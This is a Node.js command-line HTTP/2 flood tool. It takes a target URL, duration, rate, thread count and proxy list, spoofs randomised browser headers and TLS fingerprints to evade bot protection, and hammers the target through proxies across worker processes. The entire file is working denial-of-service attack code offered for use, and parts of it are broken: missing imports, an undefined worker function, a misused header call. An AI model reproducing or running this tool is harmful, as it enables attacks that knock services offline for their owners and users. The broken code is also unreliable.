const crypto = require('crypto');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const url = require('url');
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};
var parsed = url.parse(args.target);
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
function generateBexnxxHeaders() {
    const browserDistribution = [
        { name: 'chrome', weight: 0.4 },
        { name: 'firefox', weight: 0.2 },
        { name: 'safari', weight: 0.1 },
        { name: 'edge', weight: 0.1 },
        { name: 'opera', weight: 0.1 },
        { name: 'samsung', weight: 0.05 },
        { name: 'yandex', weight: 0.1 },
        { name: 'ie', weight: 0.01 },
        { name: 'vivaldi', weight: 0.08 },
    ];

    function weightedRandomChoice(items) {
        const totalWeight = items.reduce((sum, item) => sum + item.weight, 0);
        let random = Math.random() * totalWeight;
        for (const item of items) {
            if (random < item.weight) {
                return item.name;
            }
            random -= item.weight;
        }
        return items[items.length - 1].name;
    };

    function getRandomVersion(min, max, decimalPlaces = 0) {
        const factor = Math.pow(10, decimalPlaces);
        return (Math.floor(Math.random() * (max * factor - min * factor + 1)) + min * factor) / factor;
    };

    const browser = weightedRandomChoice(browserDistribution);
    let os;

    if (browser === 'vivaldi') {
        os = `${['Windows', 'Linux', 'macOS'][Math.floor(Math.random() * 3)]}`;
    } else if (browser === 'samsung') {
        os = `Android`;
    } else if (browser === 'opera') {
        os = `${['Windows', 'Linux', 'Android', 'macOS'][Math.floor(Math.random() * 4)]}`;
    } else if (browser === 'safari') {
        os = Math.random() < 0.7 ? 'iOS' : 'macOS';
    } else {
        const osDistribution = [
            { name: 'Windows', weight: 0.7 },
            { name: 'macOS', weight: 0.5 },
            { name: 'Linux', weight: 0.5 },
            { name: 'Android', weight: 0.45 },
            { name: 'iOS', weight: 0.3 }
        ];
        os = weightedRandomChoice(osDistribution);
    }
    
    const versions = {
        chrome: {
            stable: { min: 116, max: 128 },
            beta: { min: 129, max: 130 },
            dev: { min: 131, max: 132 },
            canary: { min: 133, max: 135 },
        },
        firefox: { min: 90, max: 114 },
        safari: { min: 14, max: 17, decimalPlaces: 1 },
        edge: { min: 90, max: 114 },
        opera: { min: 80, max: 99 },
        samsung: { min: 17, max: 21 },
        yandex: { min: 22, max: 23 },
        ie: { min: 11, max: 11 },
        vivaldi: { min: 5, max: 6, decimalPlaces: 1 },
    };

    function getChromeVersion() {
        const channel = Math.random();
        if (channel < 0.75) {
            return getRandomVersion(versions.chrome.stable.min, versions.chrome.stable.max);
        } else if (channel < 0.9) {
            return getRandomVersion(versions.chrome.beta.min, versions.chrome.beta.max);
        } else if (channel < 0.98) {
            return getRandomVersion(versions.chrome.dev.min, versions.chrome.dev.max);
        } else {
            return getRandomVersion(versions.chrome.canary.min, versions.chrome.canary.max);
        }
    };

    const chromeVersion = getChromeVersion();
    const version = browser === 'chrome' ? chromeVersion : getRandomVersion(versions[browser].min, versions[browser].max, versions[browser].decimalPlaces || 0);

    function generateAcceptHeader() {
        const types = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
        ];
        return types[Math.floor(Math.random() * types.length)];
    };
function generateAcceptLanguage() {
    function weightedRandomChoice(items) {
        let random = Math.random() * items.reduce((sum, item) => sum + item.weight, 0);
        for (const item of items) {
            if (random < item.weight) return item.code;
            random -= item.weight;
        }
        return items[items.length - 1].code;
    };

    const primaryLanguages = [
        { code: "en-US", weight: 0.4 },
        { code: "en-GB", weight: 0.2 },
        { code: "en-CA", weight: 0.1 },
        { code: "en-AU", weight: 0.1 },
    ];

    const secondaryLanguages = [
        { code: "fr", weight: 0.2 },
        { code: "de", weight: 0.2 },
        { code: "es", weight: 0.2 },
        { code: "zh-CN", weight: 0.1 },
        { code: "ja", weight: 0.1 },
        { code: "ru", weight: 0.1 },
        { code: "pt", weight: 0.1 },
    ];

    const primary = weightedRandomChoice(primaryLanguages);
    let accept = `${primary};q=0.9`;

    if (Math.random() > 0.3) {
        let secondary;
        do {
            secondary = weightedRandomChoice(secondaryLanguages);
        } while (secondary === primary.split('-')[0]);

        accept += `,${secondary};q=${(Math.floor(Math.random() * 3) + 6) / 10}`;
    }
    
    if (Math.random() > 0.7) {
        const primaryLanguageWithoutRegion = primary.split('-')[0];
        if (!accept.includes(`${primaryLanguageWithoutRegion};q=0.8`)) {
            accept += `,${primaryLanguageWithoutRegion};q=0.8`;
        }
    }
    return accept;
};

    function generateUserAgent(browser, os, version) {
        const osStrings = {
            Windows: `Windows NT ${['10.0', '6.1', '6.2', '6.3'][Math.floor(Math.random() * 4)]}${Math.random() < 0.3 ? '; Win64; x64' : ''}`,
            macOS: `Macintosh; Intel Mac OS X ${Math.floor(Math.random() * 3) + 10}_${Math.floor(Math.random() * 15)}_${Math.floor(Math.random() * 9)}`,
            Linux: `${['X11; Linux x86_64', 'X11; Ubuntu; Linux x86_64', 'X11; Fedora; Linux x86_64', 'X11; Arch Linux; Linux x86_64', 'X11; Debian; Linux x86_64', 'X11; CentOS; Linux x86_64', 'X11; Linux i686'][Math.floor(Math.random() * 7)]}`,
            Android: `Linux; ${['Android ' + (Math.floor(Math.random() * 3) + 12) + '; M2102J20SG', 'Android ' + (Math.floor(Math.random() * 3) + 12) + '; Pixel 7 Pro', 'Android ' + (Math.floor(Math.random() * 3) + 12) + '; Pixel 6', 'Android ' + (Math.floor(Math.random() * 3) + 12) + '; SM-G991B', 'Android ' + (Math.floor(Math.random() * 3) + 12) + '; 2201116SG', 'Android 10; K'][Math.floor(Math.random() * 6)]}`,
            iOS: `iPhone; CPU iPhone OS ${Math.floor(Math.random() * 5) + 13}_${Math.floor(Math.random() * 5)}_${Math.floor(Math.random() * 5)} like Mac OS X`,
        };

        const userAgents = {
            chrome: os === 'iOS' ? `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${version}.0.0 Mobile/15E148 Safari/604.1` : `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0${os === 'Android' ? ' Mobile' : ''} Safari/537.36`,
            firefox: os === 'iOS' ? `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/${version}.0 Mobile/15E148 Safari/605.1.15` : `Mozilla/5.0 (${osStrings[os]}; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
            safari: `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0${os === 'iOS' ? ' Mobile/15E148' : ''} Safari/605.1.15`,
            edge: os === 'iOS' ? `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/${version}.0.0.0 Mobile/15E148 Safari/605.1.15` : `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0${os === 'Android' ? ' Mobile' : ''} Safari/537.36 ${os === 'Android' ? 'EdgA' : 'Edg'}/${version}.0.0.0`,
            opera: `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0${os === 'Android' ? ' Mobile' : ''} Safari/537.36 OPR/${version}.0.0.0`,
            samsung: `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/${version}.0 Chrome/${chromeVersion}.0.0.0 Mobile Safari/537.36`,
            yandex: os === 'iOS' ? `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 YaBrowser/${version}.0.0 Mobile/15E148 Safari/604.1` : `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 YaBrowser/${version}.0.0.0${os === 'Android' ? ' Mobile' : ''}${os === 'Android' ? '' : ' Yowser/2.5'} Safari/537.36`,
            vivaldi: `Mozilla/5.0 (${osStrings[os]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36 Vivaldi/${version}.0.0.0`,
            ie: `Mozilla/5.0 (Windows NT ${['10.0', '6.1', '6.2', '6.3'][Math.floor(Math.random() * 4)]}; Trident/${version}.0; rv:11.0) like Gecko`,
        };

        return userAgents[browser];
    };

    const bexnxx = {
        "user-agent": generateUserAgent(browser, os, version),
        "accept": generateAcceptHeader(),
        "accept-encoding": Math.random() < 0.7 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
        "accept-language": generateAcceptLanguage(),
        "upgrade-insecure-requests": "1",
    };
    
    if (browser !== 'safari' || browser !== 'ie') {
            bexnxx["sec-ch-ua-mobile"] = os === 'Android' ? "?1" : "?0";
            bexnxx["sec-ch-ua-platform"] = `"${os}"`;
        if (['opera', 'yandex', 'vivaldi'].includes(browser)) {
            bexnxx["sec-ch-ua"] = `"${browser.charAt(0).toUpperCase() + browser.slice(1)}";v="${version}", "Chromium";v="${chromeVersion}", "Not=A?Brand";v="99"`;
        } else if (browser === 'chrome') {
            bexnxx["sec-ch-ua"] = `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not=A?Brand";v="99"`;
        } else if (browser === 'firefox') {
            bexnxx["sec-ch-ua"] = `"Firefox"="${version}", "Gecko"="20100101", "Mozilla"="${version}"`;
        } else if (browser === 'samsung') {
            bexnxx["sec-ch-ua"] = `sec-ch-ua: "${chromeVersion}";v="114", "SamsungBrowser";v="${version}", "Not A(Brand";v="99"`;
        } else if (browser === 'edge') {
            bexnxx["sec-ch-ua"] = `sec-ch-ua: "${chromeVersion}";v="114", "Microsoft Edge";v="${version}", "Not A(Brand";v="99"`;
        }

           bexnxx["sec-fetch-dest"] = "document";
           bexnxx["sec-fetch-mode"] = "navigate";
           bexnxx["sec-fetch-site"] = "none";
           bexnxx["sec-fetch-user"] = "?1";
    }
    
    return bexnxx;
};

function generateClientHello(hostname) {
function generateRandomBytes(length) {
    return crypto.randomBytes(length);
}
    const sessionId = generateRandomBytes(32);
    const random = generateRandomBytes(32);
    
    const cipherSuites = [
        'c02b', 'c02f', 'c02c', 'c030', 'cca9', 'cca8', 'c013', 'c014',
        'c009', 'c00a', '009c', '009d', '002f', '0035', '000a'
    ];
    
    const extensions = [
        { type: 0x0000, data: '00' }, // server_name
        { type: 0x0017, data: '00' }, // extended_master_secret
        { type: 0x0023, data: '00' }, // session_ticket
        { type: 0x000d, data: '001400120403080404010503080505010806060102' }, // signature_algorithms
        { type: 0x000b, data: '0100' }, // ec_point_formats
        { type: 0x000a, data: '000c001d001700180019001c001b' }, // supported_groups
        { type: 0x0010, data: '0005000300010000' }, // application_layer_protocol_negotiation
        { type: 0x000f, data: '0101' }, // heartbeat
        { type: 0x0015, data: '0101' }, // padding
    ];
    
    let clientHello = Buffer.alloc(0);
    
    // TLS Record
    clientHello = Buffer.concat([
        clientHello,
        Buffer.from('16', 'hex'), // Content Type: Handshake
        Buffer.from('0301', 'hex'), // Version: TLS 1.0 (for backward compatibility)
        Buffer.alloc(2) // Length (to be filled later)
    ]);
    
    // Handshake
    const handshake = Buffer.concat([
        Buffer.from('01', 'hex'), // Handshake Type: Client Hello
        Buffer.alloc(3), // Length (to be filled later)
        Buffer.from('0303', 'hex'), // Version: TLS 1.2
        random,
        Buffer.from([sessionId.length]),
        sessionId,
        Buffer.from([(cipherSuites.length * 2) >> 8, (cipherSuites.length * 2) & 0xff]),
        ...cipherSuites.map(suite => Buffer.from(suite, 'hex')),
        Buffer.from('01'), // Compression Methods Length
        Buffer.from('00'), // Compression Method: null
    ]);
    
    // Extensions
    const extensionsBuffer = Buffer.concat([
        Buffer.alloc(2), // Extensions Length (to be filled later)
        ...extensions.map(ext => {
            return Buffer.concat([
                Buffer.from([(ext.type >> 8) & 0xff, ext.type & 0xff]),
                Buffer.from([(ext.data.length / 2) >> 8, (ext.data.length / 2) & 0xff]),
                Buffer.from(ext.data, 'hex')
            ]);
        })
    ]);
    
    extensionsBuffer.writeUInt16BE(extensionsBuffer.length - 2, 0);
    
    clientHello = Buffer.concat([clientHello, handshake, extensionsBuffer]);
    
    // Fill in lengths
    clientHello.writeUInt16BE(clientHello.length - 5, 3);
    clientHello.writeUInt24BE(clientHello.length - 9, 6);
    
    return clientHello;
}

function pingweb() {
    return new Promise((resolve, reject) => {
        const generateClientHello = generateClientHello(parsed.host)
        const hdrr = generateBexnxxHeaders();
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        const headers = {
            ':method': 'GET',
            ':path': parsed.pathname,
            ':authority': parsed.host,
            ':scheme': 'https',
            ...hdrr()
        };

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 10000,
            maxSockets: 256,
            maxFreeSockets: 256
        });

        const req = http.request({
            host: proxy[1],
            port: proxy[2],
            method: 'CONNECT',
            path: `${parsed.host}:443`,
            agent: agent,
            timeout: 10000,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            }
        });

        req.on('connect', (res, socket, head) => {
            if (res.statusCode === 200) {
                const tlsSocket = tls.connect({
                    socket: socket,
                    servername: parsed.host,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    rejectUnauthorized: false,
                    ciphers: tls.getCiphers().join(':') + ':TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256',
                    secureOptions: crypto.constants.SSL_OP_NO_COMPRESSION | 
                                   crypto.constants.SSL_OP_NO_TICKET | 
                                   crypto.constants.SSL_OP_NO_RENEGOTIATION |
                                   crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                                   crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE,
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    honorCipherOrder: true,
                    sessionTimeout: 5000,
                    sigalgs: [
                        'ecdsa_secp256r1_sha256',
                        'ecdsa_secp384r1_sha384',
                        'ecdsa_secp521r1_sha512',
                        'rsa_pss_rsae_sha256',
                        'rsa_pss_rsae_sha384',
                        'rsa_pss_rsae_sha512',
                        'rsa_pkcs1_sha256',
                        'rsa_pkcs1_sha384',
                        'rsa_pkcs1_sha512'
                    ].join(':'),
                    ecdhCurve: 'X25519:P-256:P-384:P-521',
                    curves: 'X25519:P-256:P-384:P-521',
                    ticketKeys: crypto.randomBytes(48),
                    session: crypto.randomBytes(32),
                    pskCallback: (socket, identity) => {
                        if (identity === 'someIdentity') {
                            return Buffer.from('someSecret');
                        }
                        return null;
                    }
                }, () => {
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tlsSocket,
                        settings: {
                            headerTableSize: 65536,
                            maxConcurrentStreams: 1000,
                            initialWindowSize: 6291456,
                            maxHeaderListSize: 262144,
                            enablePush: false,
                            maxFrameSize: 16384,
                            maxHeaderListSize: 262144
                        },
                        maxSessionMemory: 64,
                        maxDeflateDynamicTableSize: 4096,
                        paddingStrategy: http2.constants.PADDING_STRATEGY_CALLBACK,
                        peerMaxConcurrentStreams: 250,
                        protocol: 'https:',
                        enableTrace: true,
                        localWindowSize: 15728640,
                        maxOutstandingPings: 10,
                        maxReservedRemoteStreams: 200,
                        peerMaxConcurrentStreams: 250,
                        settingsTimeout: 5000
                    });

                    client.on('error', (err) => reject(err));
                    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, generateClientHello);
                    function request() {
                        const stream = client.request(headers, {
                            endStream: false,
                            weight: 16,
                            exclusive: false,
                            waitForTrailers: true
                        });

                        stream.on('response', (responseHeaders) => {
                            if (responseHeaders[':status'] === 429) {
                                stream.close(http2.constants.NGHTTP2_REFUSE_STREAM);
                                tlsSocket.destroy();
                                reject(new Error('Rate limited'));
                                return;
                            }
                        });

                        let responseBody = '';
                        stream.on('data', (chunk) => {
                            responseBody += chunk.toString();
                        });

                        stream.on('end', () => {
                            client.close();
                            resolve({ headers: stream.responseHeaders, body: responseBody });
                        });

                        stream.on('error', (err) => {
                            reject(err);
                            client.close();
                        });

                        stream.on('timeout', () => {
                            stream.close(http2.constants.NGHTTP2_CANCEL);
                            reject(new Error('Stream timed out'));
                        });

                        stream.end();
                        setTimeout(request, 1000 / args.Rate);
                    }

                    request();
                });
                tlsSocket.on('error', (err) => reject(err));
            } else {
                reject(new Error(`Proxy connection failed: ${res.statusCode}`));
            }
        });

        req.on('error', (err) => reject(err));
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timed out'));
        });

        req.end();
    });
}

async function getIsp() {
    try {
        const apiUrl = `https://ipinfo.bexnxx.us.kg/api?ip=${parsed.host}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            return data.isp;
        } else {
            return 'N/A';
        }
    } catch (error) {
        return 'N/A';
    }
}
if (cluster.isMaster) {
    (async () => {
    const isp = await getIsp();
        console.clear();
        console.log(`\x1b[35m|=====================================|\x1b[0m`);
        console.log(`\x1b[36m\x1b[1mTarget: \x1b[0m\x1b[37m` + process.argv[2]);
        console.log(`\x1b[36m\x1b[1mTime: \x1b[0m\x1b[37m` + process.argv[3]);
        console.log(`\x1b[36m\x1b[1mRate: \x1b[0m\x1b[37m` + process.argv[4]);
        console.log(`\x1b[36m\x1b[1mThread: \x1b[0m\x1b[37m` + process.argv[5]);
        console.log(`\x1b[36m\x1b[1mProxyFile: \x1b[0m\x1b[37m` + process.argv[6]);
        console.log(`\x1b[36m\x1b[1mIsp: \x1b[0m\x1b[37m` + isp);
        console.log(`\x1b[35m|=====================================|\x1b[0m`);

        const restartScript = () => {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            console.log('[>] Restarting script...');
            setTimeout(() => {
                for (let counter = 1; counter <= args.threads; counter++) {
                    cluster.fork();
                }
            }, 1000);
        };

        const handleRAMUsage = () => {
            const totalRAM = os.totalmem();
            const usedRAM = totalRAM - os.freemem();
            const ramPercentage = (usedRAM / totalRAM) * 100;
            if (ramPercentage >= 80) {
                console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
                restartScript();
            }
        };

        setInterval(handleRAMUsage, 1000);

        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }

        setTimeout(() => {
            console.log("attack ended");
            process.exit();
        }, args.time * 1000);
    })();
} else {
    setInterval(flooders);
}